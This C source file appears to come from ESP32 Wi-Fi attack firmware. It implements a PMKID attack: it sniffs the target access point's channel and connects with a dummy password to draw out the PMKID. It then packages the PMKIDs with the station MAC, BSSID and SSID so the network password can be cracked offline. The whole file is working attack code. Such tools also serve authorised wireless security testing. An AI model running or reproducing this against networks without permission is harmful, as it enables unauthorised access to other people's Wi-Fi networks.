#include "Attack/attack_pmkid.h"

#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "AttackLog/log.h"

#include "Attack/attack.h"
#include "WifiController/wifi_controller.h"
#include "FrameAnalyzer/frame_analyzer.h"
#include "FrameAnalyzer/frame_analyzer_types.h"

static const char* TAG = "attack_pmkid";
static const wifi_ap_record_t *ap_record = NULL;

/**
 * @brief Callback for DATA_FRAME_EVENT_PMKID event.
 */
static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ATTACK_LOG_D(TAG, "PMKID found. Stop attack.");
    attack_update_status(FINISHED);
    attack_pmkid_stop();
    
    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;
    // count how many PMKIDs in the list
    pmkid_item_t *pmkid_item = pmkid_item_head;
    unsigned pmkid_item_count = 1; 
    while((pmkid_item = pmkid_item->next) != NULL){
        pmkid_item_count++;
    }

    // MAC_STA + MAC_AP + SSID size + SSID + PMKID * count
    char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *) ap_record->ssid) + (pmkid_item_count * 16));
    wifictl_get_sta_mac((uint8_t *) content);
    content += 6;
    memcpy(content, ap_record->bssid, 6);
    content += 6;
    content[0] = strlen((char *) ap_record->ssid);
    content += 1;
    strcpy(content, (char *) ap_record->ssid);
    content += strlen((char *) ap_record->ssid);

    // copy PMKIDs into continuous memory into "content" in status 
    pmkid_item = pmkid_item_head;
    do {
        pmkid_item_head = pmkid_item;
        memcpy(content, pmkid_item_head->pmkid, 16); // pmkid_item_head is pointer to struct, first 16 bytes is pmkid array
        content += 16;
        pmkid_item = pmkid_item->next;
        free(pmkid_item_head);
    } while(pmkid_item != NULL);

    ATTACK_LOG_D(TAG, "PMKID attack finished");
}

void attack_pmkid_start(attack_config_t *attack_config){
    ATTACK_LOG_I(TAG, "Starting PMKID attack...");
    ap_record = attack_config->ap_record;
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
    wifictl_sta_connect_to_ap(ap_record, "dummypassword");
    ESP_ERROR_CHECK(esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_PMKID, &pmkid_exit_condition_handler, NULL));
}

void attack_pmkid_stop(){
    wifictl_sta_disconnect();
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    ESP_ERROR_CHECK(esp_event_handler_unregister(ESP_EVENT_ANY_BASE, ESP_EVENT_ANY_ID, &pmkid_exit_condition_handler));
    ATTACK_LOG_D(TAG, "PMKID attack stopped");
}
